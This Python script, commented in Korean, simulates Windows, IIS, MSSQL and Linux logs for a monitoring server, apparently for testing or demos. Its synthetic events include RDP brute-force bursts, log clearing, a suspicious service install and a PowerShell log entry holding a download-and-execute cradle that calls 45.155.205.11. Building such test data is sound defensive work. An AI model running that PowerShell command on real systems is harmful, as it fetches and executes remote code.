#!/usr/bin/env python3
"""가짜 Windows PC / 웹 서버(IIS) / DB 서버(MSSQL) / Linux 서버가 로그를 보내는 것처럼 흉내 내는 시뮬레이터.

실제 에이전트(Fluent Bit)가 보내는 것과 같은 형태의 레코드를 /api/ingest 로 전송한다.
  - Windows 이벤트: event_data_as_map 을 켠 에이전트처럼 EventData(이름 있는 필드) + StringInserts
  - IIS: tail 로 읽은 W3C 줄 그대로 (#Fields 머리줄 포함) → 서버가 해석
  - MSSQL: 응용 프로그램 이벤트 로그(MSSQLSERVER) + ERRORLOG 줄
표준 라이브러리만 사용 — 설치 없이 실행 가능.

  python3 tools/simulate.py                       # 과거 24시간치 채우고 실시간 전송 계속
  python3 tools/simulate.py --backfill-hours 0    # 실시간 전송만
  python3 tools/simulate.py --once                # 과거 데이터만 넣고 종료
"""

from __future__ import annotations

import argparse
import gzip
import json
import random
import sys
import time
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timedelta, timezone

KST = timezone(timedelta(hours=9))

# (이름, 종류, 이벤트 많고 적음 가중치)
HOSTS = [
    ("WEB-01", "win", 1.4), ("WEB-02", "win", 1.2), ("APP-01", "win", 1.0), ("DB-01", "win", 0.8),
    ("DC-01", "win", 1.6), ("FILE-01", "win", 0.6), ("PC-ACC-012", "win", 0.4), ("PC-HR-007", "win", 0.3),
    ("lnx-proxy-01", "linux", 0.8),
]
IIS_HOSTS = {"WEB-01": "W3SVC1", "WEB-02": "W3SVC2"}   # 웹 서버 (IIS 접속 로그)
MSSQL_HOSTS = {"DB-01"}                               # DB 서버 (SQL Server)
OFFLINE_HOST = "PC-HR-007"   # 과거 데이터만 있고 현재는 꺼진 PC
STALE_HOST = "FILE-01"       # 시작 후 하트비트가 끊기는 PC

USERS = ["administrator", "kim.minsu", "lee.jiyoung", "park.hyun", "svc_backup", "guest", "choi.dev"]
IPS = ["10.10.1.21", "10.10.1.35", "10.10.2.14", "192.168.0.77", "203.0.113.45"]
ATTACKER_IPS = ["203.0.113.45", "198.51.100.23", "45.155.205.11"]
SERVICES = [("wuauserv", "Windows Update"), ("Spooler", "Print Spooler"), ("W3SVC", "World Wide Web Publishing Service"),
            ("MSSQLSERVER", "SQL Server (MSSQLSERVER)"), ("BITS", "Background Intelligent Transfer Service")]
APPS = ["w3wp.exe", "sqlservr.exe", "explorer.exe", "chrome.exe", "java.exe"]

SEC_PROVIDER = ("Microsoft-Windows-Security-Auditing", "{54849625-5478-4994-A5BA-3E3B0328C30D}")
SCM_PROVIDER = ("Service Control Manager", "{555908D1-A6D7-4695-8E1E-26931D2012F4}")
AUDIT_SUCCESS, AUDIT_FAILURE, CLASSIC = "0x8020000000000000", "0x8010000000000000", "0x80000000000000"


def logon_data(event_id: int, user: str, ip: str, logon_type: str) -> dict:
    """4624/4625 의 실제 EventData 필드 순서 (StringInserts 위치와 같다)."""
    if event_id == 4625:
        return {"SubjectUserSid": "S-1-0-0", "SubjectUserName": "-", "SubjectDomainName": "-", "SubjectLogonId": "0x0",
                "TargetUserSid": "S-1-0-0", "TargetUserName": user, "TargetDomainName": "CORP", "Status": "0xc000006d",
                "FailureReason": "%%2313", "SubStatus": "0xc000006a", "LogonType": logon_type,
                "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "-",
                "TransmittedServices": "-", "LmPackageName": "-", "KeyLength": "0", "ProcessId": "0x0",
                "ProcessName": "-", "IpAddress": ip, "IpPort": str(random.randint(40000, 65000))}
    return {"SubjectUserSid": "S-1-5-18", "SubjectUserName": "-", "SubjectDomainName": "-", "SubjectLogonId": "0x3e7",
            "TargetUserSid": "S-1-5-21-1", "TargetUserName": user, "TargetDomainName": "CORP",
            "TargetLogonId": hex(random.randint(1, 2**24)), "LogonType": logon_type, "LogonProcessName": "NtLmSsp ",
            "AuthenticationPackageName": "NTLM", "WorkstationName": "-", "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
            "TransmittedServices": "-", "LmPackageName": "NTLM V2", "KeyLength": "128", "ProcessId": "0x0",
            "ProcessName": "-", "IpAddress": ip, "IpPort": str(random.randint(40000, 65000))}


def win_templates():
    """(가중치, 생성함수). 생성함수는 (channel, provider, guid, event_id, level, keywords, message, data) 반환.
    data 가 dict 면 EventData(이름 있음) + StringInserts, list 면 StringInserts 만."""
    def logon_ok():
        u, ip = random.choice(USERS[:5]), random.choice(IPS[:4])
        return ("Security", *SEC_PROVIDER, 4624, 0, AUDIT_SUCCESS,
                f"계정이 성공적으로 로그온되었습니다.\r\n\r\n새 로그온:\r\n\t계정 이름:\t\t{u}\r\n\t원본 네트워크 주소:\t{ip}\r\n\t로그온 유형:\t\t3",
                logon_data(4624, u, ip, "3"))

    def logon_fail(ip: str | None = None, logon_type: str = "3", user: str | None = None):
        u, ip = user or random.choice(USERS), ip or random.choice(IPS)
        return ("Security", *SEC_PROVIDER, 4625, 0, AUDIT_FAILURE,
                f"계정을 로그온하지 못했습니다.\r\n\r\n로그온 실패 계정:\r\n\t계정 이름:\t\t{u}\r\n\r\n실패 정보:\r\n\t실패 이유:\t\t알 수 없는 사용자 이름 또는 잘못된 암호입니다.\r\n\t상태:\t\t\t0xc000006d\r\n\r\n네트워크 정보:\r\n\t원본 네트워크 주소:\t{ip}\r\n\t로그온 유형:\t\t{logon_type}",
                logon_data(4625, u, ip, logon_type))

    def special_priv():
        u = random.choice(USERS[:2] + ["SYSTEM"])
        return ("Security", *SEC_PROVIDER, 4672, 0, AUDIT_SUCCESS,
                f"새 로그온에 특수 권한을 할당했습니다.\r\n\r\n주체:\r\n\t계정 이름:\t\t{u}\r\n\r\n권한:\t\tSeBackupPrivilege\r\n\t\t\tSeDebugPrivilege",
                {"SubjectUserSid": "S-1-5-18", "SubjectUserName": u, "SubjectDomainName": "CORP",
                 "SubjectLogonId": "0x3e7", "PrivilegeList": "SeBackupPrivilege\r\n\t\t\tSeDebugPrivilege"})

    def lockout():
        u = random.choice(USERS[1:])
        return ("Security", *SEC_PROVIDER, 4740, 0, AUDIT_SUCCESS,
                f"사용자 계정이 잠겼습니다.\r\n\r\n잠긴 계정:\r\n\t계정 이름:\t\t{u}",
                {"TargetUserName": u, "TargetDomainName": "DC-01", "TargetSid": "S-1-5-21-1-1105",
                 "SubjectUserSid": "S-1-5-18", "SubjectUserName": "DC-01$", "SubjectDomainName": "CORP",
                 "SubjectLogonId": "0x3e7"})

    def account_created():
        u = f"temp{random.randint(10, 99)}"
        return ("Security", *SEC_PROVIDER, 4720, 0, AUDIT_SUCCESS,
                f"사용자 계정을 만들었습니다.\r\n\r\n새 계정:\r\n\t계정 이름:\t\t{u}",
                {"TargetUserName": u, "TargetDomainName": "CORP", "TargetSid": "S-1-5-21-1-1201",
                 "SubjectUserSid": "S-1-5-21-1-500", "SubjectUserName": "administrator", "SubjectDomainName": "CORP"})

    def admin_group_add():
        return ("Security", *SEC_PROVIDER, 4732, 0, AUDIT_SUCCESS,
                "보안이 설정된 로컬 그룹에 구성원을 추가했습니다.\r\n\r\n그룹:\r\n\t그룹 이름:\t\tAdministrators",
                {"MemberName": "-", "MemberSid": "S-1-5-21-1-1201", "TargetUserName": "Administrators",
                 "TargetDomainName": "Builtin", "TargetSid": "S-1-5-32-544", "SubjectUserSid": "S-1-5-21-1-500",
                 "SubjectUserName": "administrator", "SubjectDomainName": "CORP"})

    def service_installed():
        return ("System", *SCM_PROVIDER, 7045, 4, CLASSIC,
                "시스템에 서비스를 설치했습니다.\r\n\r\n서비스 이름: UpdaterSvc\r\n서비스 파일 이름: C:\\Users\\Public\\upd.exe",
                {"ServiceName": "UpdaterSvc", "ImagePath": "C:\\Users\\Public\\upd.exe", "ServiceType": "사용자 모드 서비스",
                 "StartType": "자동 시작", "AccountName": "LocalSystem"})

    def log_cleared():
        return ("Security", "Microsoft-Windows-Eventlog", "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}", 1102, 4,
                "0x4020000000000000", "감사 로그를 지웠습니다.\r\n\t계정 이름:\tadministrator", ["administrator"])

    def svc_state():
        name, disp = random.choice(SERVICES)
        state = random.choice(["실행", "중지"])
        return ("System", *SCM_PROVIDER, 7036, 4, CLASSIC, f"{disp} 서비스가 {state} 상태로 전환되었습니다.",
                {"param1": disp, "param2": state})

    def svc_crash():
        name, disp = random.choice(SERVICES)
        return ("System", *SCM_PROVIDER, 7031, 2, CLASSIC,
                f"{disp} 서비스가 예기치 않게 종료되었습니다. 이 오류가 1번 발생했습니다. 다음 수정 동작이 60000밀리초 후에 수행됩니다: 서비스 다시 시작.",
                {"param1": disp, "param2": "1", "param3": "60000", "param4": "1", "param5": "서비스 다시 시작"})

    def disk_warn():
        return ("System", "disk", "", 51, 3, CLASSIC,
                r"페이징 작업 중 \Device\Harddisk1\DR1 장치에서 오류가 발견되었습니다.", [r"\Device\Harddisk1\DR1"])

    def dcom():
        return ("System", "Microsoft-Windows-DistributedCOM", "{1B562E86-B7AA-4131-BADC-B6F3A001407E}", 10016, 3, CLASSIC,
                "응용 프로그램별 권한 설정에서 CLSID {D63B10C5-BB46-4990-A94F-E40B9D520160} 및 APPID에 대한 로컬 활성화 권한을 사용자에게 부여하지 않습니다.",
                ["응용 프로그램별", "로컬", "활성화"])

    def kernel_power():
        return ("System", "Microsoft-Windows-Kernel-Power", "{331C3B3A-2005-44C2-AC5E-77220C37D6B4}", 41, 1, "0x8000400000000002",
                "먼저 시스템을 정상적으로 종료하지 않고 시스템이 다시 부팅되었습니다. 이 오류는 시스템이 응답을 멈추었거나, 충돌하였거나, 예기치 않게 전원이 꺼진 경우 발생할 수 있습니다.",
                {"BugcheckCode": "0", "BugcheckParameter1": "0x0", "SleepInProgress": "0", "PowerButtonTimestamp": "0"})

    def app_error():
        app = random.choice(APPS)
        return ("Application", "Application Error", "{a0e9b465-b939-57d7-b27d-95d8e925ff57}", 1000, 2, CLASSIC,
                f"오류 있는 응용 프로그램 이름: {app}, 버전: 10.0.20348.1, 타임스탬프: 0x5c2f1b3e\r\n오류 있는 모듈 이름: ntdll.dll\r\n예외 코드: 0xc0000005",
                [app, "10.0.20348.1", "ntdll.dll", "0xc0000005"])

    def dotnet():
        return ("Application", ".NET Runtime", "", 1026, 2, CLASSIC,
                "응용 프로그램: w3wp.exe\r\n프레임워크 버전: v4.0.30319\r\n설명: 처리되지 않은 예외로 인해 프로세스가 종료되었습니다.\r\n예외 정보: System.NullReferenceException",
                ["w3wp.exe"])

    def app_info():
        return ("Application", "Microsoft-Windows-Security-SPP", "{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}", 16384, 4, CLASSIC,
                "소프트웨어 보호 서비스를 다시 시작하도록 예약했습니다.", ["2026-10-04T00:00:00Z", "RulesEngine"])

    def powershell():
        script = "Get-Service | Where-Object Status -eq 'Running'"
        return ("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell",
                "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}", 4104, 5, "0x0",
                f"스크립트 블록 텍스트 만들기(1/1):\r\n{script}",
                {"MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": script,
                 "ScriptBlockId": str(uuid.uuid4()), "Path": ""})

    def powershell_suspicious():
        script = "IEX (New-Object Net.WebClient).DownloadString('http://45.155.205.11/a.ps1')"
        return ("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell",
                "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}", 4104, 3, "0x0",
                f"스크립트 블록 텍스트 만들기(1/1):\r\n{script}",
                {"MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": script,
                 "ScriptBlockId": str(uuid.uuid4()), "Path": ""})

    def defender_detect():
        return ("Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-Windows Defender",
                "{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}", 1116, 3, "0x8000000000000000",
                "Microsoft Defender 바이러스 백신에서 악성 코드 또는 기타 사용자 동의 없이 설치된 소프트웨어를 발견했습니다.\r\n이름: Trojan:Win32/Wacatac.B!ml\r\n경로: file:_C:\\Users\\Public\\upd.exe",
                {"Threat Name": "Trojan:Win32/Wacatac.B!ml", "Severity Name": "심각", "Path": "file:_C:\\Users\\Public\\upd.exe",
                 "Detection User": "CORP\\kim.minsu", "Action Name": "격리"})

    def rdp_logon():
        u, ip = random.choice(USERS[:4]), random.choice(IPS[:3])
        return ("Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
                "Microsoft-Windows-TerminalServices-LocalSessionManager", "{5D896912-022D-40AA-A3A8-4FA5515C76D7}", 21, 4, "0x1000000000000000",
                f"원격 데스크톱 서비스: 세션 로그온 성공:\r\n\r\n사용자: CORP\\{u}\r\n세션 ID: 2\r\n원본 네트워크 주소: {ip}",
                {"User": f"CORP\\{u}", "SessionID": "2", "Address": ip})

    return [
        (30, logon_ok), (8, logon_fail), (10, special_priv), (0.3, lockout), (0.05, log_cleared),
        (25, svc_state), (1.2, svc_crash), (1.5, disk_warn), (4, dcom), (0.15, kernel_power),
        (2.5, app_error), (1, dotnet), (12, app_info), (3, powershell), (0.05, powershell_suspicious),
        (0.04, account_created), (0.02, admin_group_add), (0.03, service_installed), (0.02, defender_detect),
        (1.5, rdp_logon),
    ]


WIN = win_templates()
WIN_WEIGHTS = [w for w, _ in WIN]
TEMPLATE = {f.__name__: f for _, f in WIN}
record_ids: dict[str, int] = {}


def win_record(host: str, at: datetime, fn=None, *args) -> dict:
    fn = fn or random.choices([f for _, f in WIN], WIN_WEIGHTS)[0]
    channel, provider, guid, event_id, level, keywords, message, data = fn(*args)
    record_ids[host] = record_ids.get(host, random.randint(10_000, 900_000)) + 1
    record = {
        "date": at.astimezone(timezone.utc).isoformat().replace("+00:00", "Z"),
        "ProviderName": provider,
        "ProviderGuid": guid,
        "Qualifiers": 16384 if event_id in (7036, 7031, 7045) else 0,
        "EventID": event_id,
        "Version": 0,
        "Level": level,
        "Task": 12544 if channel == "Security" else 0,
        "Opcode": 0,
        "Keywords": keywords,
        "TimeCreated": at.astimezone(KST).strftime("%Y-%m-%d %H:%M:%S %z"),
        "EventRecordID": record_ids[host],
        "ActivityID": "{" + str(uuid.uuid4()).upper() + "}" if channel == "Security" else "",
        "RelatedActivityID": "",
        "ProcessID": random.choice([4, 612, 812, 1460, 2280]),
        "ThreadID": random.randint(100, 9000),
        "Channel": channel,
        "Computer": f"{host}.corp.local",
        "UserID": "S-1-5-18" if channel != "Security" else "",
        "Message": message,
        "agent_host": host,
        "log_source": "winevtlog",
    }
    if isinstance(data, dict):
        record["EventData"] = data
        record["StringInserts"] = list(data.values())
    else:
        record["StringInserts"] = data
    return record


# ------------------------------------------------------------------ MSSQL

MSSQL_EVENTS = [
    # (가중치, 이벤트 ID, 수준, 키워드, 메시지)
    (6, 18456, 0, "0x90000000000000", "Login failed for user '{user}'. Reason: Password did not match that for the login provided. [CLIENT: {ip}]"),
    (5, 18264, 4, CLASSIC, "Database backed up. Database: ERP, creation date(time): 2026/01/05(09:12:01), pages dumped: 120331, first LSN: 1203:331:1, last LSN: 1203:350:1, number of dump devices: 1, device information: (FILE=1, TYPE=DISK: {{'D:\\Backup\\ERP.bak'}})."),
    (0.4, 3041, 2, CLASSIC, "BACKUP failed to complete the command BACKUP DATABASE ERP. Check the backup application log for detailed messages."),
    (0.3, 9002, 2, CLASSIC, "The transaction log for database 'ERP' is full due to 'LOG_BACKUP'."),
    (0.1, 824, 1, CLASSIC, "SQL Server detected a logical consistency-based I/O error: incorrect checksum. It occurred during a read of page (1:4520) in database ID 7."),
    (2, 17137, 4, CLASSIC, "Starting up database 'tempdb'."),
]


def mssql_event(host: str, at: datetime) -> dict:
    _, event_id, level, keywords, template = random.choices(MSSQL_EVENTS, [e[0] for e in MSSQL_EVENTS])[0]
    message = template.format(user=random.choice(["sa", "erp_app", "report"]), ip=random.choice(IPS + ATTACKER_IPS))

    def fn():
        return ("Application", "MSSQLSERVER", "", event_id, level, keywords, message, [message])
    return win_record(host, at, fn)


def mssql_errorlog(host: str, at: datetime) -> list[dict]:
    stamp = at.astimezone(KST).strftime("%Y-%m-%d %H:%M:%S.%f")[:22]
    base = {"agent_host": host, "log_source": "mssql",
            "file": r"C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Log\ERRORLOG",
            "date": at.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")}
    kind = random.choices(["login", "backup", "logfull", "info"], [6, 3, 0.4, 4])[0]
    if kind == "login":
        user, ip = random.choice(["sa", "erp_app"]), random.choice(ATTACKER_IPS + IPS)
        lines = [f"{stamp} Logon       Error: 18456, Severity: 14, State: 8.",
                 f"{stamp} Logon       Login failed for user '{user}'. Reason: Password did not match that for the login provided. [CLIENT: {ip}]"]
    elif kind == "backup":
        lines = [f"{stamp} Backup      BACKUP DATABASE successfully processed 120331 pages in 12.402 seconds (75.789 MB/sec)."]
    elif kind == "logfull":
        lines = [f"{stamp} spid62      Error: 9002, Severity: 17, State: 2.",
                 f"{stamp} spid62      The transaction log for database 'ERP' is full due to 'LOG_BACKUP'."]
    else:
        lines = [f"{stamp} spid15s     Starting up database 'ERP'."]
    return [{**base, "log": line} for line in lines]


# -------------------------------------------------------------------- IIS

IIS_HEADER = ("#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip "
              "cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken")
URLS = [("/", 20), ("/api/orders", 25), ("/api/login", 8), ("/static/app.js", 15), ("/admin", 2), ("/wp-login.php", 1),
        ("/api/report", 4)]
AGENTS = ["Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+Chrome/130.0", "curl/8.4.0",
          "Mozilla/5.0+(compatible;+Googlebot/2.1)"]


def iis_file(host: str, at: datetime) -> str:
    return rf"C:\inetpub\logs\LogFiles\{IIS_HOSTS[host]}\u_ex{at:%y%m%d}.log"


def _date(at: datetime) -> str:
    return at.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")


def iis_header(host: str, at: datetime) -> dict:
    return {"date": _date(at), "log": IIS_HEADER, "file": iis_file(host, at), "agent_host": host, "log_source": "iis"}


def iis_record(host: str, at: datetime) -> dict:
    url = random.choices([u for u, _ in URLS], [w for _, w in URLS])[0]
    status = random.choices([200, 304, 404, 401, 500, 503], [85, 5, 5, 2, 2, 1])[0]
    if url == "/wp-login.php":
        status = 404
    query = f"id={random.randint(1, 9999)}" if url.startswith("/api") else "-"
    user = random.choice(USERS[1:4]) if url.startswith("/api") and status == 200 and random.random() < 0.4 else "-"
    ip = random.choice(ATTACKER_IPS) if url in ("/wp-login.php", "/admin") else random.choice(IPS[:4])
    taken = random.randint(800, 9000) if status >= 500 else random.randint(3, 400)
    t = at.astimezone(timezone.utc)
    line = (f"{t:%Y-%m-%d %H:%M:%S} 10.10.1.{10 if host == 'WEB-01' else 11} GET {url} {query} 443 {user} {ip} "
            f"{random.choice(AGENTS)} - {status} 0 0 {taken}")
    return {"date": _date(at), "log": line, "file": iis_file(host, at), "agent_host": host, "log_source": "iis"}


# ----------------------------------------------------------------- Linux

def linux_record(host: str, at: datetime) -> dict:
    choice = random.choices(
        [("sshd", 10, 6, "Accepted publickey for deploy from 10.10.1.21 port 51122 ssh2"),
         ("sshd", 10, 4, f"Failed password for invalid user admin from {random.choice(ATTACKER_IPS)} port 40022 ssh2"),
         ("nginx", 3, 3, "upstream timed out (110: Connection timed out) while reading response header"),
         ("kernel", 0, 3, "TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies."),
         ("CRON", 9, 6, "(root) CMD (/usr/local/bin/backup.sh)"),
         ("systemd", 3, 6, "Started Daily apt download activities."),
         ("nginx", 3, 2, "connect() failed (111: Connection refused) while connecting to upstream")],
        [20, 6, 3, 1, 8, 6, 1.5])[0]
    ident, facility, severity, message = choice
    return {
        "date": at.astimezone(timezone.utc).isoformat().replace("+00:00", "Z"),
        "pri": str(facility * 8 + severity),
        "time": at.astimezone(KST).strftime("%b %d %H:%M:%S"),
        "host": host,
        "ident": ident,
        "pid": str(random.randint(300, 40000)),
        "message": message,
        "source_ip": "10.10.3.10",
        "agent_host": host,
        "log_source": "syslog",
    }


def make_records(host: str, kind: str, at: datetime) -> list[dict]:
    """한 번에 PC 한 대가 만드는 로그. 웹 서버는 IIS 줄, DB 서버는 MSSQL 로그가 섞인다."""
    if kind == "linux":
        return [linux_record(host, at)]
    roll = random.random()
    if host in IIS_HOSTS and roll < 0.55:
        return [iis_record(host, at)]
    if host in MSSQL_HOSTS and roll < 0.2:
        return [mssql_event(host, at)]
    if host in MSSQL_HOSTS and roll < 0.35:
        return mssql_errorlog(host, at)
    return [win_record(host, at)]


def heartbeat(host: str) -> dict:
    return {"type": "heartbeat", "agent_host": host, "config_version": "0.2.0",
            "date": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")}


class Sender:
    def __init__(self, url: str, key: str):
        self.url = url.rstrip("/") + "/api/ingest"
        self.key = key

    def send(self, records: list[dict], retries: int = 10) -> None:
        for i in range(0, len(records), 1000):
            body = gzip.compress(json.dumps(records[i:i + 1000], ensure_ascii=False).encode())
            request = urllib.request.Request(self.url, data=body, method="POST", headers={
                "Content-Type": "application/json", "Content-Encoding": "gzip", "X-API-Key": self.key})
            for attempt in range(retries + 1):
                try:
                    with urllib.request.urlopen(request, timeout=30) as response:
                        response.read()
                    break
                except urllib.error.HTTPError as exc:
                    if exc.code < 500:  # 401(키 오류) 등은 재시도해도 소용없다
                        sys.exit(f"전송 실패 {exc.code}: {exc.read().decode(errors='replace')}")
                    error = f"HTTP {exc.code}"
                except (urllib.error.URLError, ConnectionError, TimeoutError) as exc:
                    error = str(getattr(exc, "reason", exc))
                # 서버 재시작 중일 수 있다 (개발 모드 자동 재시작) → 잠시 후 다시 (실제 에이전트도 재시도한다)
                if attempt == retries:
                    sys.exit(f"서버에 연결할 수 없습니다 ({self.url}): {error}")
                time.sleep(min(2 ** attempt, 10))


def daytime_weight(at: datetime) -> float:
    hour = at.astimezone(KST).hour
    return 1.0 if 8 <= hour < 19 else 0.35


def attack_burst(at: datetime) -> list[dict]:
    """외부 IP 한 곳에서 원격 데스크톱(LogonType 10)으로 무차별 대입하는 장면."""
    ip = random.choice(ATTACKER_IPS)
    return [win_record("DC-01", at + timedelta(seconds=i * 2), TEMPLATE["logon_fail"], ip, "10", random.choice(USERS))
            for i in range(40)]


def backfill(sender: Sender, hours: float, per_hour: int) -> None:
    now = datetime.now(timezone.utc)
    start = now - timedelta(hours=hours)
    records = [iis_header(h, start) for h in IIS_HOSTS]   # IIS 는 파일마다 머리줄이 먼저 나온다
    for host, kind, weight in HOSTS:
        n = int(hours * per_hour * weight)
        for _ in range(n):
            at = start + timedelta(seconds=random.uniform(0, hours * 3600))
            if random.random() > daytime_weight(at):
                continue
            records += make_records(host, kind, at)
    records += attack_burst(now - timedelta(hours=min(hours, 5.5)))
    records.sort(key=lambda r: (r.get("date") or "", 0 if r.get("log", "").startswith("#") else 1))
    print(f"과거 {hours}시간 데이터 {len(records):,}건 전송 중…")
    sender.send(records)
    sender.send([heartbeat(h) for h, _, _ in HOSTS if h != OFFLINE_HOST])


def run_live(sender: Sender, rate: float) -> None:
    print(f"실시간 전송 시작 (초당 약 {rate}건). Ctrl+C 로 종료")
    started = time.time()
    last_hb = 0.0
    weights = [w for _, _, w in HOSTS]
    sender.send([iis_header(h, datetime.now(timezone.utc)) for h in IIS_HOSTS])
    while True:
        now = datetime.now(timezone.utc)
        batch = []
        for _ in range(max(0, int(random.gauss(rate, rate / 3)))):
            host, kind, _ = random.choices(HOSTS, weights)[0]
            if host == OFFLINE_HOST:
                continue
            batch += make_records(host, kind, now - timedelta(milliseconds=random.randint(0, 900)))
        # 가끔 오류 이벤트를 몰아서 (화면에서 눈에 띄게)
        if random.random() < 0.02:
            host = random.choice(["WEB-01", "APP-01"])
            batch += [win_record(host, now, TEMPLATE["app_error"]) for _ in range(random.randint(3, 8))]
        if random.random() < 0.003:
            batch += attack_burst(now)
        if time.time() - last_hb >= 30:
            alive = [h for h, _, _ in HOSTS if h != OFFLINE_HOST and not (h == STALE_HOST and time.time() - started > 60)]
            batch += [heartbeat(h) for h in alive]
            last_hb = time.time()
        if batch:
            sender.send(batch)
        time.sleep(1)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--url", default="http://localhost:8080")
    parser.add_argument("--key", default="dev-ingest-key", help="WLM_INGEST_API_KEYS 중 하나")
    parser.add_argument("--backfill-hours", type=float, default=24)
    parser.add_argument("--per-hour", type=int, default=120, help="과거 데이터: PC 한 대당 시간당 이벤트 수")
    parser.add_argument("--rate", type=float, default=4, help="실시간: 초당 이벤트 수")
    parser.add_argument("--once", action="store_true", help="과거 데이터만 넣고 종료")
    args = parser.parse_args()

    sender = Sender(args.url, args.key)
    if args.backfill_hours > 0:
        backfill(sender, args.backfill_hours, args.per_hour)
    if not args.once:
        try:
            run_live(sender, args.rate)
        except KeyboardInterrupt:
            print("\n종료")


if __name__ == "__main__":
    main()
